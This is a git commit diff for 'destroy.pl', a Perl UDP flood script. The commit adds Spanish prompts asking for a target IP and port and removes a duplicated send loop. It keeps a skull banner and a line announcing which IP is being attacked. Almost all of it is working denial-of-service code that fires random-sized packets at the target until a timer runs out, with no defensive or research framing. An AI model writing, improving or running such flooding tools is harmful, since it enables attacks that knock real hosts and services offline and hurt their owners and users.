27b5b7692db99d12a581592b48c7a48181dbce77
zJonchx <jonathaneliaschavez123@gmail.com>
2025-06-20 19:05:40 -0300

    Update destroy.pl

--- destroy.pl
+++ destroy.pl
@@ -1,31 +1,34 @@
 #!/usr/bin/perl
- 
-##
-#!/usr/bin/perl
- 
+
 use Socket;
 use strict;
- 
-my ($ip,$port,$size,$time) = @ARGV;
- 
-my ($iaddr,$endtime,$psize,$pport);
- 
+
+# Solicitar la IP y el puerto al usuario
+print "Ingresa la IP de destino: ";
+chomp(my $ip = <STDIN>);
+print "Ingresa el puerto de destino (deja en blanco para aleatorio): ";
+chomp(my $port = <STDIN>);
+
+# Mantener el comportamiento original para size y time
+my ($size, $time) = @ARGV;
+
+my ($iaddr, $endtime, $psize, $pport);
+
 $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
- 
- 
+
 print <<EOTEXT;
-     
-     
-     
+
+
+
                    ...
                  ;::::; 
                ;::::; :;
              ;:::::'   :;
             ;:::::;     ;.
-           ,:::::'       ;           OOO\
-           ::::::;       ;          OOOOO\
+           ,:::::'       ;           OOO\\
+           ::::::;       ;          OOOOO\\
            ;:::::;       ;         OOOOOOOO
           ,;::::::;     ;'         / OOOOOOO
         ;:::::::::`. ,,,;.        /  / DOOOOOO
@@ -41,19 +44,13 @@ print <<EOTEXT;
       `:::::`::::::::;' /  / `:#
        ::::::`:::::;'  /  /   `#
 EOTEXT
-     
+
 print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .
 ($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
 ($time ? "for $time seconds" : "") . "\n";
-  
+
 for (;time() <= $endtime;) {
-$psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(65500))+1;
-     
-send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
-$iaddr));}for (;time() <= $endtime;) {
-$psize = $size ? $size : int(rand(1024-64)+64) ;
-$pport = $port ? $port : int(rand(65500))+1;
- 
-send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
-$iaddr));}
+    $psize = $size ? $size : int(rand(1024-64)+64) ;
+    $pport = $port ? $port : int(rand(65500))+1;
+    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
+}
